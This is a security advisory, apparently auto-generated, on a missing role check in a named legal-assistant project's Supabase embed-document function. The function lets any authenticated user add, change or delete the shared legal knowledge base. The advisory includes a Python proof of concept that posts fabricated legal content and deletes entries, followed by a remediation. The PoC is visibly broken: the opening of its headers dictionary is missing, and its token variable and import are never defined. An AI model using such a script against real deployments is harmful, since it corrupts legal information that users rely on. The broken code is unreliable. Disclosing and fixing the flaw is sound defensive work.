# Missing Authorization in embed-document Edge Function

**ID:** vuln-0001
**Severity:** HIGH
**Found:** 2026-07-12 09:57:49 UTC
**Target:** https://github.com/zhengzhicong98-source/legal-assistant
**Endpoint:** supabase/functions/embed-document/index.ts
**Method:** POST
**CWE:** CWE-862
**CVSS:** 7.6

## Description

The embed-document Edge Function (`supabase/functions/embed-document/index.ts`) authenticates users via JWT but uses the service_role database client (which bypasses all Row-Level Security) for all database operations. The function never checks whether the authenticated user holds an admin or moderator role before performing create, update, or delete operations on the `legal_knowledge` table.

This means any authenticated user can add, modify, or delete knowledge base documents — including the legal reference data that powers the RAG-based legal chat.

## Impact

Any authenticated user can arbitrarily modify the legal knowledge base that powers the AI legal chat system. An attacker could inject false legal information (leading to incorrect AI advice), delete legitimate legal references (causing gaps in AI responses), or manipulate the knowledge base for malicious purposes. Since the knowledge base is shared across all users, a single authenticated user can compromise the integrity of the entire application's legal advice system.

## Technical Analysis

In `supabase/functions/embed-document/index.ts`, the function:

1. Authenticates the user via JWT (line 50-61): `await userClient.auth.getUser(token)` — only validates token, never checks role.

2. Creates a service_role client for all DB operations (line 59): `const supabase = createClient(supabaseUrl, serviceKey)` — this bypasses all RLS policies.

3. DELETE handler (line 91-102): Deletes from `legal_knowledge` using service_role client without admin check.

4. PATCH handler (line 131-141): Updates `legal_knowledge.embedding` using service_role client without admin check.

5. POST handler (line ~175+): Inserts new `legal_knowledge` entries using service_role client without admin check.

The `requireAdmin` function from `_shared/auth.ts` is available in the codebase but is never imported or used in embed-document. Additionally, the RLS policies in migration 00026 were tightened to require admin/moderator role for legal_knowledge mutations, but this Edge Function bypasses all RLS by using the service_role key.

## Proof of Concept

1. Obtain any valid JWT token (e.g., by registering a user account)
2. Send a POST request to the embed-document Edge Function with the JWT in the Authorization header
3. Include a JSON body with `title`, `content`, and `source` fields
4. The function will insert the document into `legal_knowledge` using the service_role key, bypassing RLS
5. Similarly, send a DELETE request with an `id` field to delete any knowledge base entry

```

# The embed-document function accepts POST with JWT auth for any authenticated user
# but uses service_role key for DB operations without checking admin/moderator role

SUPABASE_URL = "https://your-project.supabase.co"
ANON_KEY = "your-anon-key"

# Step 1: Get a valid session token (any authenticated user)
# This simulates a normal user obtaining a token

    "Authorization": f"Bearer {ANON_KEY}",
    "Content-Type": "application/json"
}
# In practice, use supabase.auth.signUp() or similar

# Step 2: Call embed-document to create a knowledge base entry
# Any authenticated user can do this, not just admins
payload = {
    "title": "Attacker Controlled Legal Document",
    "source": "Attacker Source",
    "category": "恶意篡改",
    "content": "This is false legal information injected by an attacker."
}

response = requests.post(
    f"{SUPABASE_URL}/functions/v1/embed-document",
    headers={"Authorization": f"Bearer {VALID_USER_TOKEN}", **headers},
    json=payload
)
print(f"Create response: {response.status_code} - {response.text}")

# Step 3: Delete any knowledge base entry by ID
# Also possible with an authenticated user (no admin check)
delete_payload = {"id": "any-knowledge-base-id"}
response = requests.delete(
    f"{SUPABASE_URL}/functions/v1/embed-document",
    headers={"Authorization": f"Bearer {VALID_USER_TOKEN}", **headers},
    json=delete_payload
)
print(f"Delete response: {response.status_code} - {response.text}")
```

## Remediation

1. Import `requireAdmin` from `../_shared/auth.ts` in `supabase/functions/embed-document/index.ts`
2. After JWT authentication in each mutation handler (DELETE, PATCH, POST), call `requireAdmin(user, req)` to verify the user has admin or moderator role
3. If `requireAdmin` returns a non-null Response, return that Response immediately
4. For the read-only GET handler, the existing JWT authentication is sufficient

Example fix for the POST handler:
```typescript
const authResult = await requireAuth(req)
if (authResult instanceof Response) return authResult
const { user, supabaseAdmin } = authResult

// Check admin/moderator role
const adminCheck = requireAdmin(user, req)
if (adminCheck) return adminCheck
```

Apply the same pattern to DELETE and PATCH handlers.
